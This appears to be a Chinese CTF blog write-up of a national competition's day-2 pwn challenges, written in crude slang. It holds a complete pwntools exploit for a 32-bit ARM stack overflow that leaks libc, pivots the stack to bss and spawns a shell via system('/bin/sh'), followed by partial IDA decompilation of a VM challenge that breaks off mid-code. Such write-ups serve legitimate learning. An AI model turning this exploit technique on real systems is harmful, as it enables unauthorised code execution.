<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>国赛day2pwn复现 | Tinia's blog</title><meta name="description" content="国赛day2pwn复现"><meta name="keywords" content="pwn"><meta name="author" content="Tinia"><meta name="copyright" content="Tinia"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/a.jpg"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="国赛day2pwn复现"><meta name="twitter:description" content="国赛day2pwn复现"><meta name="twitter:image" content="http://Tinia.top/img/cover.jpg"><meta property="og:type" content="article"><meta property="og:title" content="国赛day2pwn复现"><meta property="og:url" content="http://tinia.top/2020/11/06/%E5%9B%BD%E8%B5%9Bday2pwn%E5%A4%8D%E7%8E%B0/"><meta property="og:site_name" content="Tinia's blog"><meta property="og:description" content="国赛day2pwn复现"><meta property="og:image" content="http://Tinia.top/img/cover.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://tinia.top/2020/11/06/%E5%9B%BD%E8%B5%9Bday2pwn%E5%A4%8D%E7%8E%B0/"><link rel="prev" title="湖湘杯复现" href="http://tinia.top/2020/11/07/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/"><link rel="next" title="深入理解操作系统读书笔记" href="http://tinia.top/2020/10/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: {"text":"喵喵喵,富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善,奥利给","fontSize":"15px"},
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  isHome: false,
  isPost: true
  
}</script><meta name="generator" content="Hexo 4.2.0"></head><body><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">Tinia's blog</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div></div></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/head.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">29</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">10</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#pwn1"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">pwn1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#pwn2"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">pwn2</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#pwn3"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">pwn3</span></a></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="color"></div><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1"><span class="toc-number">1.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2"><span class="toc-number">2.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn3"><span class="toc-number">3.</span> <span class="toc-text">pwn3</span></a></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(/img/cover.jpg)"><div id="post-info"><div id="post-title"><div class="posttitle">国赛day2pwn复现</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 发表于 2020-11-06<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> 更新于 2020-11-07</time><div class="post-meta-wordcount"><div class="post-meta-pv-cv"><span><i class="fa fa-eye post-meta__icon fa-fw" aria-hidden="true"> </i>阅读量:</span><span id="busuanzi_value_page_pv"></span><span class="post-meta__separator">|</span><i class="fa fa-comments-o post-meta__icon fa-fw" aria-hidden="true"></i><span>评论数:</span><a href="/2020/11/06/%E5%9B%BD%E8%B5%9Bday2pwn%E5%A4%8D%E7%8E%B0/#post-comment"><span class="gitalk-comment-count comment-count"></span></a></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><p>阴间比赛。2.5h解题解你🐎呢！</p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>32位armpwn。幸好👴虚拟🐓里有arm环境。但不得不说，“断网”arm玩你🐎呢？没环境的就只能盲☀</p>
<p>题不难。用pop{r3, pc} ret2text泄露libc，然后栈转移到bss上getshell。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'arm'</span></span><br><span class="line">nodebug = <span class="number">1</span></span><br><span class="line">exe = <span class="string">'bin'</span></span><br><span class="line">elf = ELF(exe)</span><br><span class="line">glibc = <span class="string">'/usr/arm-linux-gnueabihf/lib/libc.so.6'</span></span><br><span class="line"><span class="keyword">if</span> nodebug:</span><br><span class="line">    <span class="comment">#p = remote('172.1.33.13',9999)</span></span><br><span class="line">    p = process([<span class="string">"qemu-arm"</span>,<span class="string">'-L'</span>,<span class="string">'/usr/arm-linux-gnueabihf'</span>,exe])</span><br><span class="line">    libc = ELF(glibc)</span><br><span class="line">    <span class="comment">#libc = ELF('libc-2.31.so')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-arm"</span>,<span class="string">'-g'</span>,<span class="string">'1242'</span>,<span class="string">'-L'</span>,<span class="string">'/usr/arm-linux-gnueabihf'</span>,exe])</span><br><span class="line">    libc = ELF(glibc)</span><br><span class="line">gadget = <span class="number">0x00010348</span>     <span class="comment">#R3,PC</span></span><br><span class="line">main = <span class="number">0x000104A0</span></span><br><span class="line">bss = <span class="number">0x00021034</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x100</span>+p32(bss+<span class="number">0x800</span>)+p32(gadget)+p32(elf.got[<span class="string">'printf'</span>])+p32(<span class="number">0x000104D8</span>)</span><br><span class="line">p.sendafter(<span class="string">'input: '</span>,payload)</span><br><span class="line">libcbase = u32(p.recv(<span class="number">4</span>))-libc.sym[<span class="string">'printf'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'printf'</span>])</span><br><span class="line">log.success(<span class="string">'libcbase-&gt;%#x'</span>%libcbase)</span><br><span class="line"><span class="comment">#gadget2 = libcbase+0x0006beec</span></span><br><span class="line">gadget2 = libcbase+<span class="number">0x56b7c</span> <span class="comment">#r0 r4 pc</span></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x100</span>+p32(bss+<span class="number">0x500</span>)+p32(gadget2)+p32(libcbase+libc.search(<span class="string">'/bin/sh\x00'</span>).next())+p32(<span class="number">0</span>)+p32(libcbase+libc.sym[<span class="string">'system'</span>])</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>比赛时👴只做出了这一道pwn。</p>
<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>vm虚拟🐓。先malloc一块内存。</p>
<p>先点开run看一下。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *a1 &gt; (<span class="keyword">unsigned</span> __int64)(a1[<span class="number">7</span>] - <span class="number">1L</span>L) || a1[<span class="number">1</span>] &gt; (<span class="keyword">unsigned</span> __int64)(a1[<span class="number">3</span>] - <span class="number">8L</span>L) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line"><span class="keyword">switch</span> ( *(<span class="keyword">unsigned</span> __int8 *)(a1[<span class="number">6</span>] + *a1) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( a1[<span class="number">1</span>] &lt;= (<span class="keyword">unsigned</span> __int64)(a1[<span class="number">3</span>] - <span class="number">8L</span>L) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)(<span class="number">8L</span>L * (a1[<span class="number">1</span>] &gt;&gt; <span class="number">3</span>) + a1[<span class="number">2</span>]) = *(_QWORD *)(<span class="number">8L</span>L * (*(_QWORD *)(a1[<span class="number">2</span>] + <span class="number">8L</span>L * (a1[<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) &gt;&gt; <span class="number">3</span>)</span><br><span class="line">                                                          + a1[<span class="number">4</span>]);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( a1[<span class="number">1</span>] &lt;= (<span class="keyword">unsigned</span> __int64)(a1[<span class="number">3</span>] - <span class="number">16L</span>L) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)(a1[<span class="number">4</span>] + <span class="number">8L</span>L * (*(_QWORD *)(a1[<span class="number">2</span>] + <span class="number">8L</span>L * (a1[<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) &gt;&gt; <span class="number">3</span>)) = *(_QWORD *)(a1[<span class="number">2</span>]</span><br><span class="line">                                                                                            + <span class="number">8</span> * ((a1[<span class="number">1</span>] &gt;&gt; <span class="number">3</span>) + <span class="number">1L</span>L));</span><br><span class="line">      a1[<span class="number">1</span>] += <span class="number">16L</span>L;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>

<p>实在是🌶👀。</p>
<p>先添加一个结构体，不然星际玩家实在是逆不动</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> machine         struc ; (<span class="keyword">sizeof</span>=<span class="number">0x40</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> times           dq ?</span><br><span class="line"><span class="number">00000008</span> s_size_2        dq ?</span><br><span class="line"><span class="number">00000010</span> s_ptr           dq ?                    ; offset</span><br><span class="line"><span class="number">00000018</span> s_size          dq ?</span><br><span class="line"><span class="number">00000020</span> d_ptr           dq ?                    ; offset</span><br><span class="line"><span class="number">00000028</span> d_size          dq ?</span><br><span class="line"><span class="number">00000030</span> c_ptr           dq ?                    ; offset</span><br><span class="line"><span class="number">00000038</span> c_size          dq ?</span><br><span class="line"><span class="number">00000040</span> machine         ends</span><br></pre></td></tr></table></figure></div>

<p>添加完再看看run</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( m-&gt;times &gt; m-&gt;c_size - <span class="number">1</span> || m-&gt;s_size_2 &gt; m-&gt;s_size - <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">switch</span> ( m-&gt;c_ptr[m-&gt;times] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] = m-&gt;d_ptr[m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] &gt;&gt; <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        m-&gt;d_ptr[m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] &gt;&gt; <span class="number">3</span>] = m-&gt;s_ptr[(m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>];</span><br><span class="line">        m-&gt;s_size_2 += <span class="number">0x10</span>LL;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] + m-&gt;s_ptr[(m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>];</span><br><span class="line">        m-&gt;s_size_2 += <span class="number">8L</span>L;</span><br><span class="line">        m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] = v2;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] - m-&gt;s_ptr[(m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>];</span><br><span class="line">        m-&gt;s_size_2 += <span class="number">8L</span>L;</span><br><span class="line">        m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] = v3;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] * m-&gt;s_ptr[(m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>];</span><br><span class="line">        m-&gt;s_size_2 += <span class="number">8L</span>L;</span><br><span class="line">        m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] = v4;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( m-&gt;s_ptr[(m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] / m-&gt;s_ptr[(m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>];</span><br><span class="line">          m-&gt;s_size_2 += <span class="number">8L</span>L;</span><br><span class="line">          m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] = v5;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">        &#125;</span><br><span class="line">        result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( m-&gt;s_ptr[(m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] % m-&gt;s_ptr[(m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>];</span><br><span class="line">          m-&gt;s_size_2 += <span class="number">8L</span>L;</span><br><span class="line">          m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] = v6;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">        &#125;</span><br><span class="line">        result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] &amp; m-&gt;s_ptr[(m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>];</span><br><span class="line">        m-&gt;s_size_2 += <span class="number">8L</span>L;</span><br><span class="line">        m-&gt;s_ptr[m-&gt;s_size_2 &gt;&gt; <span class="number">3</span>] = v7;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">      <span class="keyword">if</span> ( m-&gt;s_size_2 &lt;= m-&gt;s_size - <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span 